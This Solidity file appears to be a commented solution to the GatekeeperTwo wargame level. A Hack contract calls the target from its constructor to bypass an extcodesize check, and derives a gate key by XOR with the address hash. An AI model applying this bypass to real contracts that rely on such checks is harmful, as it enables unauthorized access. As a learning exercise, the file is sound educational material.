// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 也可以用
// interface IGateKeeperTwo {
//     function entrant() external view returns (address);
//     function enter(bytes8) external returns (bool);
// }

// contract Hack {
//     constructor(IGateKeeperTwo target) {

contract Hack {
    constructor(GatekeeperTwo target) {
        // max = 11...11
        // s ^ key = max;
        // s ^ s ^ key = key = s ^ max;

        // ^异或运算(相同返回0，不同返回1)
        // a = 1010
        // b = 1100
        // a ^ b = 0110

        // a ^ a ^ b = b
        // 0 ^ b = b

        // a = 1010;
        // a = 1010;
        // a ^ a = 0000;

        uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 k = s ^ type(uint64).max;

        bytes8 key = bytes8(k);
        // 上面的三行代码也能写成：bytes8 key = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        require(target.enter(key), "failed");
    }
}

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    // 修饰符gateTwo的作用是确保调用者的外部代码大小为0。它使用了汇编语言的extcodesize函数来获取调用者的外部代码大小，并将其与0进行比较。
    // hack 合约的代码大小必须等于零
    // assembly 关键字表示可以在合约直接编写低级的汇编代码
    // xtcodesize 是一个汇编指令，用于获取调用者（caller()）的合约代码大小
    // := 表示赋值操作符，也可用 = 赋值
    // 合约代码大小为0并不意味着合约没有任何状态或数据。合约可以包含状态变量和存储数据，即使没有实际的代码逻辑即没有任何函数或语句， 比如合约可能只是引用了其他合约。
    modifier gateTwo() {
        uint x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    // 使用一个8字节的_gateKey来验证调用者的地址:
    // 使用了keccak256哈希函数来计算msg.sender的哈希值，并将其与_gateKey进行异或运算。如果异或的结果等于uint64的最大值，require语句将通过，函数将继续执行。
    // 异或运算（XOR）比较两个值的不同之处：如果两值不相同就返回 true，如果两值相同就返回 false;
    // uint64 类型的最大值，即 2^64-1，也就是所有位上是1，也就是异或的两个值是相反的关系。
    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
                type(uint64).max
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
